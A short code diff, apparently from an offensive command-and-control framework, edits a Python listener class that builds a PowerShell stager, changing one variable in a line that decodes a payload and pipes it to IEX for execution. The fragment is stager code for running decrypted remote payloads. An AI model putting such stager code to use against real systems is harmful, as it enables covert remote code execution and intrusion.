@@ -361,7 +361,7 @@ class Listener:
             stager += "0..300 | ForEach-Object { $_ };"
 
             # decode everything and kick it over to IEX to kick off execution
-            stager += "$t5 = -join[Char[]](& $R $mdata ($IV+$Kk)); $T5 | IEX"
+            stager += "$t5 = -join[Char[]](& $M $mdata ($IV+$Kk)); $T5 | IEX"
 
             # Remove comments and make one line
             stager = helpers.strip_powershell_comments(stager)
